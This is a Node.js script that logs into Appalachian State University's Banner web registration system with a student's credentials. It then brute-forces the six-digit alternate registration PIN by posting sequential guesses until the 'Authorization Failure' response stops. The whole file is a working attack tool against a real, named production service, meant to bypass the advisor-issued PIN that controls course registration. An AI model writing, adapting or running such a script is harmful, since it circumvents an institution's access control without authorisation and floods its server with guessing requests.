const agent = require('superagent').agent(); // need persistent agent for cookies
const inquirer = require('inquirer');
const cheerio = require('cheerio');
const cookie = require('cookie');
require('draftlog').into(console)

let loginUrl = `https://bannerweb.appstate.edu/pls/PROD/twbkwbis.P_ValLogin`;
let altPinUrl = 'https://bannerweb.appstate.edu/pls/PROD/bwskfreg.P_AltPin';
let verifyPinUrl = 'https://bannerweb.appstate.edu/pls/PROD/bwskfreg.P_CheckAltPin';

let headers = {
    'Host':'bannerweb.appstate.edu',
    'Origin':'https://bannerweb.appstate.edu',
    // 'Cookie': 'TESTID=set;',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36',
    Referer: 'https://bannerweb.appstate.edu/pls/PROD/twbkwbis.P_WWWLogin'
};

function zeroPad(num, numZeros) {
    var n = Math.abs(num);
    var zeros = Math.max(0, numZeros - Math.floor(n).toString().length );
    var zeroString = Math.pow(10, zeros).toString().substr(1);
    if( num < 0 ) {
        zeroString = '-' + zeroString;
    }

    return zeroString+n;
}

inquirer.prompt([
    {
        name: 'username',
        message: 'ASU Username:'
    },
    {
        name: 'password',
        message: 'ASU Passcode:',
        type: 'password'
    },
    {
        name: 'term',
        message: 'Term',
        type: 'list',
        choices:  [
            { name: 'Spring', value: '10'},
            { name: 'Fall', value: '40'}
        ]
    },
    {
        name: 'start',
        message: 'Start index',
        default: 0
    }
]).then((answers) => {
    // login
    agent
    .post(loginUrl)
    .set(headers)
    .set('Cookie', 'TESTID=set;') // need this cookie set on initial request
    .type('form')
    .send({ sid: answers.username })
    .send({ PIN: answers.password })
    .end((err, res, body) => {
        if (cookie.parse(res.headers['set-cookie'][0])['SESSID'].length == 0) {
            console.log('Login failed.')
            return;
        }

        // spring semester is always the next calendar year
        year = answers.term == '10' ? new Date().getFullYear() + 1 : new Date().getFullYear();

        agent
        .post(altPinUrl) // sets up the session for proper term
        .set(headers)
        .type('form')
        .send({ term_in: year + answers.term })
        .end((err, res) => {
            const $ = cheerio.load(res.text);
            // indicates presence of add-by-CRN form,
            // meaning the PIN has already been successfully entered
            if ($(`[action="\/pls\/PROD\/bwckcoms.P_Regs"]`).length > 0) {
                console.log('Looks like you have already entered a PIN.');
                return;
            }

            const info = console.draft();
            const result = console.draft();
            let tryPin = (pin) => {
                const realPin = zeroPad(pin, 6);
                info(`Trying ${ realPin }...`);
                agent
                .post(verifyPinUrl)
                .set(headers)
                .type('form')
                .send({ pin: realPin })
                .end((err, res) => {
                    const $ = cheerio.load(res.text);
                    if ($('.infotext').text().includes('Authorization Failure')) {
                        result(`${ realPin } was incorrect`);
                        // if pin failed, increment real pin value
                        // and recurse
                        pin++;
                        tryPin(pin);
                    }
                    else {
                        result(`PIN was ${ realPin }. You can now register.`);
                    }
                });
            }

            tryPin(answers.start);
        });
    });
});
